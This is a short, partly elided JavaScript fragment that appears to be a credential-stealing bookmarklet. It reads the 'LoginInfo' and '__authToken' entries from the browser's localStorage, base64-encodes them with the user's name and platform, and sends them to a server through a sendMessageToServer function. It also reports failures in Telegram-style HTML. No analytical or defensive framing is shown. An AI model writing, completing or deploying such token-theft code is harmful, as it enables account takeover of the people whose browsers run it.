(async () => {
    ...
    try {
        ...
        const keys = ["LoginInfo", "__authToken"];
        ...
        await sendMessageToServer(toBase64(JSON.stringify({ localstorage: localStorageData, code: code, username: username, platform: platform })), 0, "", code, username, platform);

    } catch (err) {
        await sendMessageToServer("📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Failed to load bookmarklet</b>\n\nError: <code>" + err.message + "</code>", 1, "", code, username, platform);
    }
})();
